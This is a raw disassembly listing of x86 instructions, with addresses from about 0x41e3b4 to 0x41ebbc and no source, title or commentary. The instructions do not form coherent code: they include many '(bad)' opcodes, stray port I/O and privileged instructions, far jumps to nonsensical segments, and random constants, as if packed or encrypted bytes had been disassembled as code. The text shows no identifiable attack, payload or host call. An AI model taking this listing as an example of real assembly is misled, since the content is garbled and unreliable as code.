  41e3b4:	jbe    0x41e3f1
  41e3b6:	nop
  41e3b7:	xchg   ebp,eax
  41e3b8:	lods   al,BYTE PTR ds:[esi]
  41e3b9:	xor    al,BYTE PTR [eax-0x4ea85f1e]
  41e3bf:	loop   0x41e435
  41e3c1:	pop    ebp
  41e3c2:	outs   dx,BYTE PTR gs:[esi]
  41e3c4:	and    al,0xd8
  41e3c6:	mov    ecx,0xec9bfa7b
  41e3cb:	imul   ebx,DWORD PTR [eax],0xffffffa9
  41e3ce:	dec    eax
  41e3cf:	inc    esp
  41e3d0:	xchg   ebp,eax
  41e3d1:	cld    
  41e3d2:	sbb    ch,bh
  41e3d4:	pop    es
  41e3d5:	push   ebp
  41e3d6:	fnstsw WORD PTR [edi-0x2e1b5368]
  41e3dc:	push   eax
  41e3dd:	jae    0x41e40a
  41e3df:	add    BYTE PTR [ebp-0x49],cl
  41e3e2:	mov    ecx,0x69047405
  41e3e7:	mov    cl,0xea
  41e3e9:	jmp    0x2f146d56
  41e3ee:	xchg   ebx,eax
  41e3ef:	push   eax
  41e3f0:	cmp    BYTE PTR [esi+0x7c],bh
  41e3f3:	(bad)  
  41e3f4:	fld    DWORD PTR [ebx+ecx*2-0x1d4845f2]
  41e3fb:	adc    edi,DWORD PTR [eax-0x34]
  41e3fe:	fs or  eax,0x6cf0185a
  41e404:	or     edx,DWORD PTR ds:0x27f6570
  41e40a:	test   esi,eax
  41e40c:	addr16 arpl cx,cx
  41e40f:	dec    DWORD PTR [ebx]
  41e411:	mov    ebx,0xcb05d170
  41e416:	in     al,0x13
  41e418:	cdq    
  41e419:	fsubr  DWORD PTR [ebx+0x65]
  41e41c:	pop    ss
  41e41d:	stc    
  41e41e:	mov    al,ds:0x9c6f498
  41e423:	jge    0x41e3d3
  41e425:	cmp    BYTE PTR [edi-0x7d],0xce
  41e429:	test   al,0x1b
  41e42b:	xchg   edx,eax
  41e42c:	sbb    bh,BYTE PTR [edi]
  41e42e:	sbb    eax,0xf9db3b2e
  41e433:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e434:	adc    cl,BYTE PTR [edx+0x2bb87f0a]
  41e43a:	loopne 0x41e3c7
  41e43c:	xchg   ebx,eax
  41e43d:	scas   eax,DWORD PTR es:[edi]
  41e43e:	pusha  
  41e43f:	sub    BYTE PTR [edi-0x3f],dh
  41e442:	or     ebp,ebp
  41e444:	test   DWORD PTR [ebx+0x5944f508],ebx
  41e44a:	xor    BYTE PTR [esi],bh
  41e44c:	cli    
  41e44d:	lods   al,BYTE PTR ds:[esi]
  41e44e:	xlat   BYTE PTR ds:[ebx]
  41e44f:	sbb    esp,DWORD PTR [edi+esi*8]
  41e452:	xchg   ebp,eax
  41e453:	sbb    al,0xcb
  41e455:	ds dec esi
  41e457:	xchg   ebp,eax
  41e458:	fisub  DWORD PTR [ecx]
  41e45a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e45b:	sbb    al,0x4b
  41e45d:	adc    BYTE PTR ds:0x26bba411,ah
  41e463:	push   esi
  41e464:	stos   DWORD PTR es:[edi],eax
  41e465:	fstp   DWORD PTR gs:[eax-0x10]
  41e469:	inc    ebx
  41e46a:	dec    edx
  41e46b:	dec    edx
  41e46c:	push   DWORD PTR [ebp+0x41]
  41e46f:	pop    ds
  41e470:	xor    BYTE PTR [esi],ah
  41e472:	mov    edx,0x36c55c42
  41e477:	cmp    BYTE PTR [esi+0x63091f52],bh
  41e47d:	and    eax,0x30b34267
  41e482:	pusha  
  41e483:	rol    BYTE PTR [edi],cl
  41e485:	xchg   ecx,eax
  41e486:	inc    esp
  41e487:	jmp    0x2588:0xa9cec2c
  41e48e:	hlt    
  41e48f:	push   edx
  41e490:	fcmovb st,st(4)
  41e492:	out    0xf9,al
  41e494:	xchg   esp,eax
  41e495:	(bad)  
	...
  41e514:	inc    ecx
  41e515:	inc    BYTE PTR [ebx+eiz*1-0x1188441]
  41e51c:	push   ecx
  41e51d:	jecxz  0x41e544
  41e51f:	arpl   cx,cx
  41e521:	adc    ecx,DWORD PTR [edx+esi*4+0xb]
  41e525:	add    BYTE PTR [ecx],0x0
  41e528:	imul   eax,DWORD PTR [edi],0x0
  41e52b:	add    bh,ah
  41e52d:	adc    al,0xe7
  41e52f:	shr    BYTE PTR [edi+0x5e],1
  41e532:	sti    
  41e533:	into   
  41e534:	sub    edi,ebx
  41e536:	aas    
  41e537:	sbb    esp,0xca3b59ba
  41e53d:	mov    BYTE PTR [ebx-0x39f8a4b9],bl
  41e543:	or     BYTE PTR [ebx-0x63],bh
  41e546:	dec    ebx
  41e547:	ss xchg edi,eax
  41e549:	pop    es
  41e54a:	xchg   esp,eax
  41e54b:	popf   
  41e54c:	add    dh,dh
  41e54e:	les    eax,FWORD PTR [edi]
  41e550:	mov    al,0x8e
  41e552:	outs   dx,DWORD PTR ds:[esi]
  41e553:	add    BYTE PTR [eax],0x1d
  41e556:	daa    
  41e557:	sub    eax,0xe9706944
  41e55c:	inc    ebp
  41e55d:	pop    es
  41e55e:	sbb    BYTE PTR [ecx],bh
  41e560:	cwd    
  41e562:	mov    ebx,0x7e43d933
  41e567:	sbb    edi,eax
  41e569:	test   eax,0xd781253a
  41e56e:	in     al,dx
  41e56f:	hlt    
  41e570:	cs aas 
  41e572:	pop    edx
  41e573:	xor    BYTE PTR [esi-0x3a],cl
  41e576:	cmp    ah,BYTE PTR [esi+0x75]
  41e579:	test   al,0xd1
  41e57b:	cld    
  41e57c:	adc    al,0x53
  41e57e:	outs   dx,DWORD PTR ds:[esi]
  41e57f:	(bad)  
  41e580:	mov    bh,BYTE PTR [esp+eiz*4-0x78]
  41e584:	xchg   esp,eax
  41e585:	adc    ecx,DWORD PTR [edi-0x2c]
  41e588:	xchg   BYTE PTR [edx],bl
  41e58a:	pop    esi
  41e58b:	pop    ds
  41e58c:	mov    ch,0xa7
  41e58e:	xor    DWORD PTR [esi+ebx*1],esi
  41e591:	jle    0xcb30e97d
  41e597:	std    
  41e598:	push   esi
  41e599:	mov    bl,0xaa
  41e59b:	jmp    0x5c612091
  41e5a0:	add    eax,0x40aea604
  41e5a5:	push   0xffffff85
  41e5a7:	popa   
  41e5a8:	add    eax,0x9a33d6ce
  41e5ad:	sub    eax,0x362d5281
  41e5b2:	mov    al,0x91
  41e5b4:	(bad)  
  41e5b5:	sar    BYTE PTR [edi],cl
  41e5b7:	mov    WORD PTR [ecx+0x2c],ds
  41e5ba:	cmp    esp,DWORD PTR [esi]
  41e5bc:	and    eax,0xd8a772b6
  41e5c1:	loope  0x41e584
  41e5c3:	and    BYTE PTR [edx+ebx*1+0x23],ah
  41e5c7:	cmp    BYTE PTR [esi+esi*2+0x7ee54380],dl
  41e5ce:	sbb    al,0x59
  41e5d0:	or     BYTE PTR [ebp-0x7a8c4fb4],al
  41e5d6:	sub    edi,edi
  41e5d8:	xor    eax,DWORD PTR [ecx+0x70fca149]
  41e5de:	cmp    edi,DWORD PTR [edx+0x7b775c01]
  41e5e4:	inc    ecx
  41e5e5:	daa    
  41e5e6:	mov    eax,0x21bc6b8d
  41e5eb:	or     dl,bh
  41e5ed:	ja     0x41e5ee
  41e5ef:	sub    DWORD PTR [ecx+edi*4],0x57330acf
  41e5f6:	and    BYTE PTR [ebx+0x4f4ff5eb],bl
  41e5fc:	jae    0x41e585
  41e5fe:	jmp    0x41e672
  41e600:	sbb    al,0x8b
  41e602:	ins    DWORD PTR es:[edi],dx
  41e603:	inc    ecx
  41e604:	dec    DWORD PTR [edi]
  41e606:	inc    ebx
  41e607:	adc    eax,0x4ef68444
  41e60c:	and    bh,ah
  41e60e:	xor    al,0x3
  41e610:	pop    ds
  41e611:	enter  0x15d5,0xd6
  41e615:	push   eax
  41e616:	mov    ecx,0xf80b39b5
  41e61b:	int3   
  41e61c:	adc    edi,DWORD PTR [edx-0x61da0fa]
  41e622:	jecxz  0x41e5d4
  41e624:	loope  0x41e5a7
  41e626:	add    eax,0x6c2f1398
  41e62b:	inc    ebp
  41e62c:	dec    edi
  41e62d:	outs   dx,DWORD PTR ds:[esi]
  41e62e:	or     ebx,DWORD PTR [ebx-0x75e3452e]
  41e634:	cwde   
  41e635:	popf   
  41e636:	cdq    
  41e637:	mov    ebx,0xd4f74b11
  41e63c:	(bad)  
  41e63d:	ficomp DWORD PTR [edi+ebx*8+0x4f280dff]
  41e644:	xlat   BYTE PTR ds:[ebx]
  41e645:	mov    dl,0x42
  41e647:	icebp  
  41e648:	iretw  
  41e64a:	call   0xcb2:0xe4aaaed2
  41e651:	out    0x2,eax
  41e653:	psllw  mm1,QWORD PTR [ebp-0x697bf958]
  41e65a:	inc    edx
  41e65b:	mov    edx,0x7049b170
  41e660:	ds pop ebx
  41e662:	cdq    
  41e663:	mov    dl,0xd3
  41e665:	jno    0x41e626
  41e667:	test   al,0xb9
  41e669:	xchg   ecx,eax
  41e66a:	sar    DWORD PTR [ecx],1
  41e66c:	loopne 0x41e699
  41e66e:	add    al,0x4a
  41e670:	fs in  al,dx
  41e672:	inc    ecx
  41e673:	mov    ch,0xf1
  41e675:	lds    ebp,FWORD PTR [eax-0x62]
  41e678:	into   
  41e679:	xor    ecx,DWORD PTR [esi-0x68]
  41e67c:	arpl   WORD PTR [edx+0x48],bx
  41e67f:	sbb    al,0x33
  41e681:	mov    ds:0x90106f55,al
  41e686:	addr16 mov ds:0xe744,al
  41e68a:	cmp    DWORD PTR [esi+eiz*2+0x8],esp
  41e68e:	sub    DWORD PTR [edi],edi
  41e690:	adc    BYTE PTR [eax],dh
  41e692:	xchg   ebp,eax
  41e693:	jnp    0x41e713
  41e695:	arpl   bx,sp
  41e697:	xor    eax,0xf0058c2e
  41e69c:	ins    DWORD PTR es:[edi],dx
  41e69d:	fidivr DWORD PTR [esi-0x75a32c9c]
  41e6a3:	outs   dx,BYTE PTR ds:[esi]
  41e6a4:	rcr    DWORD PTR [ebx-0x574e6d87],0x83
  41e6ab:	add    DWORD PTR [esi-0x14],0xe1483c44
  41e6b2:	jb     0x41e700
  41e6b4:	data16 fst st(3)
  41e6b7:	test   ah,bh
  41e6b9:	icebp  
  41e6ba:	dec    edx
  41e6bb:	outs   dx,DWORD PTR ds:[esi]
  41e6bc:	fs mov eax,0x4fee6fd
  41e6c2:	shl    BYTE PTR [ebx-0x3f5fe4a],1
  41e6c8:	dec    ebx
  41e6c9:	aaa    
  41e6ca:	inc    ebp
  41e6cb:	arpl   WORD PTR [edx],si
  41e6cd:	inc    esi
  41e6ce:	lds    esi,FWORD PTR [eax+0x29]
  41e6d1:	mov    edi,0xc7bbe6e2
  41e6d6:	inc    edi
  41e6d7:	or     BYTE PTR [edi-0x5eb6e0f4],ch
  41e6dd:	sub    eax,DWORD PTR [edi-0x1560cda]
  41e6e3:	xor    al,0x29
  41e6e5:	mov    BYTE PTR ds:0x11f31d46,bl
  41e6eb:	out    0x5c,al
  41e6ed:	adc    DWORD PTR [ebx+0x25],ebx
  41e6f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6f1:	bound  edx,QWORD PTR [edx]
  41e6f3:	cld    
  41e6f4:	mov    ebp,0x8825907e
  41e6f9:	xchg   esi,eax
  41e6fa:	mov    bp,0xcf4b
  41e6fe:	pop    es
  41e6ff:	pop    esi
  41e700:	aas    
  41e701:	and    eax,0x71c4d35c
  41e706:	fistp  QWORD PTR [edx]
  41e708:	scas   eax,DWORD PTR es:[edi]
  41e709:	push   0x9420db3
  41e70e:	sar    BYTE PTR [ebx],0xf0
  41e711:	stos   DWORD PTR es:[edi],eax
  41e712:	jmp    0xa3b3d671
  41e717:	mov    DWORD PTR [ebx+0x18],esi
  41e71a:	aam    0xe2
  41e71c:	rcr    BYTE PTR [eax],1
  41e71e:	sbb    eax,0x73bdda70
  41e723:	xchg   edx,eax
  41e724:	out    0xb3,al
  41e726:	sub    edi,ebp
  41e728:	pop    DWORD PTR [ecx-0x1584e7ef]
  41e72e:	jae    0x41e6ea
  41e730:	sub    BYTE PTR [edx+0x76],dl
  41e733:	jge    0x41e7a0
  41e735:	aas    
  41e736:	js     0x41e6b8
  41e738:	xchg   ecx,eax
  41e739:	(bad)  
  41e73a:	(bad)  
  41e73b:	mov    bl,0xe6
  41e73d:	rcr    BYTE PTR [esi+eiz*2+0x1780dd70],0xe7
  41e745:	dec    edi
  41e746:	mov    esp,0xb725536c
  41e74b:	sub    al,0x7d
  41e74d:	jmp    0x9262:0x2725d878
  41e754:	jl     0x41e74b
  41e756:	js     0x41e72a
  41e758:	in     eax,0x8e
  41e75a:	mov    edi,DWORD PTR [ebx]
  41e75c:	add    BYTE PTR [eax-0x14afef22],dh
  41e762:	mov    eax,0xe59261e3
  41e767:	xor    ebx,esp
  41e769:	sbb    DWORD PTR [edi],ebp
  41e76b:	inc    edi
  41e76c:	arpl   WORD PTR [eax+0x28],bp
  41e76f:	add    DWORD PTR [esi+0x2cd349f0],eax
  41e775:	adc    dl,ah
  41e777:	ds (bad) 
  41e779:	sub    DWORD PTR ds:0xa744630c,edx
  41e77f:	rcl    ch,1
  41e781:	cmp    ebp,DWORD PTR [edi-0x84659a7]
  41e787:	inc    edi
  41e788:	(bad)  
  41e789:	cli    
  41e78a:	lea    esp,[eax-0x16]
  41e78d:	lahf   
  41e78e:	fmul   DWORD PTR [esi]
  41e790:	fsubr  DWORD PTR [ebx-0x15300ecd]
  41e796:	mov    ds:0x7e911f3d,al
  41e79b:	icebp  
  41e79c:	mov    esp,0xd2ac78a2
  41e7a1:	sahf   
  41e7a2:	sub    eax,0x47a98edd
  41e7a7:	adc    BYTE PTR [eax+0x68],bl
  41e7aa:	add    al,0xc4
  41e7ac:	outs   dx,DWORD PTR ds:[esi]
  41e7ad:	mov    bl,0x4a
  41e7af:	iret   
  41e7b0:	int3   
  41e7b1:	dec    esi
  41e7b2:	xchg   ebx,eax
  41e7b3:	ss call 0x749c791a
  41e7b9:	fsubr  QWORD PTR [edi+edx*8+0x7f119779]
  41e7c0:	xor    BYTE PTR [edx+0x6bdbb02d],0xc4
  41e7c7:	ins    BYTE PTR es:[edi],dx
  41e7c8:	loope  0x41e79a
  41e7ca:	arpl   WORD PTR [eax+0x48c934fb],si
  41e7d0:	pop    ds
  41e7d1:	imul   ecx,DWORD PTR [eax-0x2f],0xf05205b8
  41e7d8:	push   edx
  41e7d9:	jmp    0xcb900981
  41e7de:	jge    0x41e76f
  41e7e0:	dec    ebx
  41e7e1:	pop    edx
  41e7e2:	xchg   BYTE PTR [edx+0x35],ah
  41e7e5:	(bad)  
  41e7e6:	push   ebx
  41e7e7:	sbb    eax,0x5bac6ed7
  41e7ec:	mov    ebp,0xa9c65a34
  41e7f1:	dec    edi
  41e7f2:	mov    BYTE PTR [ecx],al
  41e7f4:	nop
  41e7f5:	cmc    
  41e7f6:	js     0x41e84a
  41e7f8:	mov    ebx,0x981fed18
  41e7fd:	fimul  DWORD PTR [eax]
  41e7ff:	xor    BYTE PTR [ecx-0x6ce4c23a],bh
  41e805:	mov    edi,DWORD PTR ds:0x15379d65
  41e80b:	mov    eax,0xc80af403
  41e810:	test   DWORD PTR [ebp-0x3fe7dd9f],esi
  41e816:	mov    ds:0x6a5afe87,eax
  41e81b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e81c:	mov    cl,0xbb
  41e81e:	aaa    
  41e81f:	loopne 0x41e7cd
  41e821:	cmp    eax,0xa3ab4a24
  41e826:	sahf   
  41e827:	js     0x41e888
  41e829:	test   BYTE PTR [ebx],dh
  41e82b:	pusha  
  41e82c:	dec    ebp
  41e82d:	push   edi
  41e82e:	inc    esp
  41e82f:	add    eax,0x8333559b
  41e834:	stc    
  41e835:	xchg   edi,eax
  41e836:	push   ds
  41e837:	hlt    
  41e838:	inc    edx
  41e839:	dec    eax
  41e83a:	test   al,0xc6
  41e83c:	sbb    al,0xfa
  41e83e:	mov    edi,0x99229a7d
  41e843:	push   ecx
  41e844:	xor    DWORD PTR gs:[eax-0x6e],edi
  41e848:	jns    0x41e864
  41e84a:	retf   0x10a3
  41e84d:	sbb    al,0x65
  41e84f:	sti    
  41e850:	lds    ecx,FWORD PTR [ebx-0x8]
  41e853:	sbb    BYTE PTR [edi-0x44],ch
  41e856:	cli    
  41e857:	(bad)  
  41e858:	pop    edi
  41e859:	scas   al,BYTE PTR es:[edi]
  41e85a:	mov    bl,0x80
  41e85c:	push   ss
  41e85d:	mov    ecx,0x6415bb7c
  41e862:	out    0x63,al
  41e864:	fiadd  WORD PTR [esi-0x30]
  41e867:	stos   BYTE PTR es:[edi],al
  41e868:	and    eax,0xa347e8e4
  41e86d:	test   DWORD PTR [ecx-0x5e61077d],0x2579d91e
  41e877:	call   0x49c7:0x86e5d758
  41e87e:	push   ds
  41e87f:	cmp    ebx,esi
  41e881:	test   al,0xd0
  41e883:	xchg   BYTE PTR [ebp-0x24],al
  41e886:	cmp    BYTE PTR cs:[ebx-0x6b3b6065],ch
  41e88d:	and    ch,dl
  41e88f:	xor    BYTE PTR [edx],bl
  41e891:	mov    BYTE PTR [edx-0x45bfde3f],dl
  41e897:	mov    ebp,0x40402b61
  41e89c:	addr16 repz fs push cs
  41e8a0:	jmp    0xb382:0x511cc290
  41e8a7:	call   DWORD PTR [esi-0x41]
  41e8aa:	repz inc ecx
  41e8ac:	and    ah,BYTE PTR [ebx+edi*2+0x7f]
  41e8b0:	fsub   st(0),st
  41e8b2:	in     eax,dx
  41e8b3:	and    BYTE PTR [ecx-0xf],bh
  41e8b6:	adc    al,BYTE PTR [edx+0x3a]
  41e8b9:	scas   eax,DWORD PTR es:[edi]
  41e8ba:	popa   
  41e8bb:	(bad)  
  41e8bc:	push   ebp
  41e8bd:	lods   eax,DWORD PTR ds:[esi]
  41e8be:	push   esp
  41e8bf:	pop    ebx
  41e8c0:	jp     0x41e8ff
  41e8c2:	ins    DWORD PTR es:[edi],dx
  41e8c3:	(bad)  
  41e8c4:	scas   eax,DWORD PTR es:[edi]
  41e8c5:	push   0x4a
  41e8c7:	(bad)  
  41e8c9:	jnp    0x41e90a
  41e8cb:	adc    bl,bl
  41e8cd:	loope  0x41e856
  41e8cf:	and    al,0x75
  41e8d1:	(bad)  
  41e8d3:	mul    DWORD PTR [eax-0x1e]
  41e8d6:	sbb    al,0x85
  41e8d8:	pop    ebx
  41e8d9:	jno    0x41e8f9
  41e8db:	inc    esp
  41e8dc:	inc    ebx
  41e8dd:	jne    0x41e91e
  41e8df:	call   DWORD PTR [edx-0x642ac6e1]
  41e8e5:	xor    bl,ah
  41e8e7:	icebp  
  41e8e8:	ror    BYTE PTR [di],1
  41e8eb:	dec    ebx
  41e8ec:	adc    ch,0x1d
  41e8ef:	push   ebx
  41e8f0:	inc    esp
  41e8f1:	mov    ch,0x6e
  41e8f3:	push   0x899a1795
  41e8f8:	les    esi,FWORD PTR [esi+0x2e]
  41e8fb:	cmp    esp,DWORD PTR [esi-0x2e]
  41e8fe:	loope  0x41e88f
  41e900:	add    DWORD PTR [eax+0x57a35a7f],esi
  41e906:	xor    eax,0xc7a6544b
  41e90b:	mov    ds:0x7ac66afe,al
  41e910:	add    eax,0x62f451a1
  41e916:	ins    BYTE PTR es:[edi],dx
  41e917:	xchg   ebx,eax
  41e918:	add    edi,0xa66a5776
  41e91e:	rcl    DWORD PTR [ebx+0x574a561d],1
  41e924:	push   ds
  41e925:	dec    esp
  41e926:	pop    eax
  41e927:	hlt    
  41e928:	jl     0x41e91f
  41e92a:	dec    eax
  41e92b:	nop
  41e92c:	imul   BYTE PTR [ecx+ebp*8+0x5e20a082]
  41e933:	nop
  41e934:	jle    0x41e946
  41e936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e937:	sti    
  41e938:	icebp  
  41e939:	dec    ecx
  41e93a:	push   ebx
  41e93b:	add    BYTE PTR [ebp-0x698da3a1],dl
  41e941:	rol    DWORD PTR [esp+ecx*8],1
  41e944:	adc    DWORD PTR [ebx-0x208be984],eax
  41e94a:	adc    DWORD PTR [ebx+0x3],ebx
  41e94d:	sub    edi,DWORD PTR [edi+0x6c]
  41e950:	stc    
  41e951:	pop    es
  41e952:	lds    ebx,FWORD PTR [ebp+ebp*2-0x257ecd0d]
  41e959:	jno    0x41e8e9
  41e95b:	and    DWORD PTR [ebx+0x3],esi
  41e95e:	xchg   eax,edi
  41e960:	xchg   ebx,eax
  41e961:	bound  ebx,QWORD PTR [eax+0x283f04fd]
  41e967:	cli    
  41e968:	mov    al,0x4f
  41e96a:	push   es
  41e96b:	aam    0xdb
  41e96d:	in     al,dx
  41e96e:	gs ret 
  41e970:	sub    DWORD PTR [edx+ebx*8],ecx
  41e973:	adc    dl,BYTE PTR [edi-0x229188b2]
  41e979:	retf   
  41e97a:	pop    esi
  41e97b:	out    dx,eax
  41e97c:	push   edx
  41e97d:	in     al,dx
  41e97e:	xor    ah,BYTE PTR [esi+ecx*4]
  41e981:	outs   dx,BYTE PTR ds:[esi]
  41e982:	or     DWORD PTR [edx+esi*1+0x20270212],0x3bb6689c
  41e98d:	and    al,BYTE PTR [ebx+0x504e05e1]
  41e993:	inc    ecx
  41e994:	jbe    0x41e953
  41e996:	mov    ebx,0x31589171
  41e99b:	inc    ebp
  41e99c:	jmp    0x41e9bf
  41e99e:	mov    BYTE PTR [eax-0x7d00c6eb],bh
  41e9a4:	out    0x3d,al
  41e9a6:	arpl   WORD PTR [edi+esi*2+0x572672e5],ax
  41e9ad:	mov    ebp,0x6c03885a
  41e9b2:	outs   dx,DWORD PTR ds:[esi]
  41e9b3:	ds aaa 
  41e9b5:	stc    
  41e9b6:	iret   
  41e9b7:	test   al,0x34
  41e9b9:	inc    eax
  41e9ba:	push   ss
  41e9bb:	mov    eax,ds:0xb934263f
  41e9c0:	xchg   edi,eax
  41e9c1:	inc    eax
  41e9c2:	push   cs
  41e9c3:	sahf   
  41e9c4:	xchg   edx,eax
  41e9c5:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41e9c7:	sub    BYTE PTR [ecx],0xdc
  41e9ca:	mov    al,0xbe
  41e9cc:	sbb    BYTE PTR [ecx],ah
  41e9ce:	mov    ebp,0xc2ad5d75
  41e9d3:	jae    0x41e974
  41e9d5:	add    BYTE PTR [ebx-0x4242748f],bh
  41e9db:	out    dx,al
  41e9dc:	or     eax,0xe3553278
  41e9e1:	scas   al,BYTE PTR es:[edi]
  41e9e2:	sub    eax,0xe374c38a
  41e9e7:	into   
  41e9e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9e9:	mov    cl,0x4d
  41e9eb:	cmp    ebp,DWORD PTR [edi]
  41e9ed:	cmp    eax,0xbd31db93
  41e9f2:	or     edx,0xffffff9c
  41e9f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9f6:	xchg   ebp,eax
  41e9f7:	or     BYTE PTR [ecx],bl
  41e9f9:	sub    esp,DWORD PTR [edi+0x25]
  41e9fc:	loope  0x41e9e1
  41e9fe:	out    dx,eax
  41e9ff:	mul    edi
  41ea01:	out    0x2f,eax
  41ea03:	ror    BYTE PTR [edx+0x72fe8760],cl
  41ea09:	dec    ecx
  41ea0a:	stos   DWORD PTR es:[edi],eax
  41ea0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea0c:	mov    esp,DWORD PTR [ebp+ecx*8+0x1b2caae0]
  41ea13:	jmp    0x97a9:0xee94ead4
  41ea1a:	in     eax,dx
  41ea1b:	les    edi,FWORD PTR [edx-0x12]
  41ea1e:	xchg   esp,eax
  41ea1f:	call   0x39c0ecb5
  41ea24:	lods   eax,DWORD PTR ds:[esi]
  41ea25:	add    eax,DWORD PTR [ecx+0x2387697]
  41ea2b:	imul   edx,DWORD PTR ds:0xeae95c13,0x977a447d
  41ea35:	add    DWORD PTR [ebx],ebx
  41ea37:	inc    esi
  41ea38:	aas    
  41ea39:	icebp  
  41ea3a:	call   ebp
  41ea3c:	pop    es
  41ea3d:	fcom   st(6)
  41ea3f:	leave  
  41ea40:	mov    eax,ds:0x60324b09
  41ea45:	lods   al,BYTE PTR ds:[esi]
  41ea46:	jns    0x41eab1
  41ea48:	mov    WORD PTR [edi],gs
  41ea4a:	mov    al,0xa6
  41ea4c:	mov    eax,ds:0x807fa8c7
  41ea51:	adc    BYTE PTR [ecx],bl
  41ea53:	mov    BYTE PTR [ecx],dl
  41ea55:	or     eax,0x862ec837
  41ea5a:	sub    BYTE PTR [edx+ebp*2+0x6a6b4517],dh
  41ea61:	mov    dh,BYTE PTR [ebx+esi*2+0x11205a17]
  41ea68:	sbb    al,0x31
  41ea6a:	(bad)  
  41ea6b:	outs   dx,BYTE PTR ds:[esi]
  41ea6c:	loopne 0x41ea1b
  41ea6e:	data16 adc ah,cl
  41ea71:	cmp    ch,BYTE PTR [edi+0xc16fd78]
  41ea77:	mov    eax,ds:0x1bf9ae19
  41ea7c:	add    eax,0x8ceff5b2
  41ea81:	sahf   
  41ea82:	test   al,0xad
  41ea84:	sbb    DWORD PTR [edi],eax
  41ea86:	mov    dh,0x3f
  41ea88:	mov    esi,0x47a700ed
  41ea8d:	into   
  41ea8e:	popa   
  41ea8f:	push   edi
  41ea90:	push   ebx
  41ea91:	or     DWORD PTR [ebp-0x3c],ebx
  41ea94:	into   
  41ea95:	jns    0x41ea21
  41ea97:	cs or  al,BYTE PTR ds:[edx]
  41ea9b:	and    eax,0x92f2845d
  41eaa0:	outs   dx,BYTE PTR ds:[esi]
  41eaa1:	outs   dx,DWORD PTR ds:[esi]
  41eaa2:	inc    ecx
  41eaa3:	pop    DWORD PTR [esi+0x2d]
  41eaa6:	add    edx,DWORD PTR [ebp+edi*1+0x4f]
  41eaaa:	jp     0x41eadb
  41eaac:	inc    esi
  41eaad:	push   cs
  41eaae:	shl    DWORD PTR [esi],1
  41eab0:	jle    0x41eb25
  41eab2:	imul   esi,DWORD PTR [edi],0xa07503b0
  41eab8:	call   FWORD PTR [esi]
  41eaba:	add    dh,BYTE PTR [eax+0x26a2f7ba]
  41eac0:	shr    BYTE PTR [eax+0x55],1
  41eac3:	iret   
  41eac4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eac5:	jmp    0x2fed:0x6b188482
  41eacc:	leave  
  41eacd:	out    dx,al
  41eace:	retf   
  41eacf:	mov    BYTE PTR [ecx+0x2e1ba366],dl
  41ead5:	xchg   ecx,eax
  41ead6:	jno    0x41eb4b
  41ead8:	push   eax
  41ead9:	adc    ebp,eax
  41eadb:	push   cs
  41eadc:	rol    bl,1
  41eade:	jg     0x41eabb
  41eae0:	push   eax
  41eae1:	aad    0xb2
  41eae3:	pop    ds
  41eae4:	ret    
  41eae5:	cmp    al,0xad
  41eae7:	mov    DWORD PTR gs:[edx+0x29],0x7028db99
  41eaef:	fiadd  WORD PTR [ebp-0x524c619a]
  41eaf5:	mov    ecx,0x8149d35
  41eafa:	aas    
  41eafb:	js     0x41eb3b
  41eafd:	lock cdq 
  41eaff:	sbb    ch,BYTE PTR [esi-0x55]
  41eb02:	adc    al,0x47
  41eb04:	sub    eax,DWORD PTR [eax-0x5754db84]
  41eb0a:	push   ecx
  41eb0b:	inc    ebp
  41eb0c:	out    dx,eax
  41eb0d:	sbb    DWORD PTR [edi-0x10e145bd],ebp
  41eb13:	nop
  41eb14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb15:	sbb    BYTE PTR [ecx+0x64a87403],ah
  41eb1b:	mov    edx,0x5c355db3
  41eb20:	xor    BYTE PTR [eax+edx*2],dh
  41eb23:	xchg   edx,eax
  41eb24:	pushf  
  41eb25:	fs je  0x41eb11
  41eb28:	lods   al,BYTE PTR ds:[esi]
  41eb29:	popf   
  41eb2a:	sbb    BYTE PTR [ecx+0x62cd5cbb],dh
  41eb30:	jo     0x41eac3
  41eb32:	icebp  
  41eb33:	rcl    BYTE PTR [edi+0x3d8984f3],1
  41eb39:	push   es
  41eb3a:	jo     0x41eb1d
  41eb3c:	call   0x1e9b:0xadeab073
  41eb43:	fwait
  41eb44:	inc    ebx
  41eb45:	jl     0x41eb13
  41eb47:	adc    eax,0x74c41f99
  41eb4c:	adc    ebp,DWORD PTR [eax+0x50b2dbd2]
  41eb52:	jae    0x41eb5b
  41eb54:	xor    DWORD PTR [ecx+esi*4-0x3c],ebp
  41eb58:	mov    esp,0xdb63e1b1
  41eb5d:	sar    BYTE PTR [edi],cl
  41eb5f:	pop    edx
  41eb60:	xchg   esi,eax
  41eb61:	les    ebx,FWORD PTR [ebx+0x4de519ae]
  41eb67:	shl    DWORD PTR [ebx+0x37a821fa],cl
  41eb6d:	adc    BYTE PTR gs:[eax-0x77266e93],ah
  41eb74:	push   0x992a4d50
  41eb79:	add    dl,0x52
  41eb7c:	pop    esp
  41eb7d:	jl     0x41eb22
  41eb7f:	pop    edi
  41eb80:	push   cs
  41eb81:	xor    ch,0x82
  41eb84:	mov    bl,BYTE PTR [eax-0x53]
  41eb87:	mov    edi,0x4309003a
  41eb8d:	shrd   DWORD PTR [edx+0x7d63ffa9],esp,cl
  41eb94:	das    
  41eb95:	mov    al,ds:0x13506a3e
  41eb9a:	pop    ebp
  41eb9b:	and    DWORD PTR [ecx-0x26],eax
  41eb9e:	shl    ebx,1
  41eba0:	mov    dl,0x5a
  41eba2:	into   
  41eba3:	nop
  41eba4:	retf   0x1c66
  41eba7:	or     dl,bh
  41eba9:	cmp    al,ch
  41ebab:	push   ss
  41ebac:	jl     0x41ebc6
  41ebae:	and    esp,DWORD PTR [edx-0x44]
  41ebb1:	aam    0x5c
  41ebb3:	xor    al,0x9a
  41ebb5:	jmp    0x41ec0e
  41ebb7:	and    eax,0x20223c9d
  41ebbc:	in     eax,0x1a
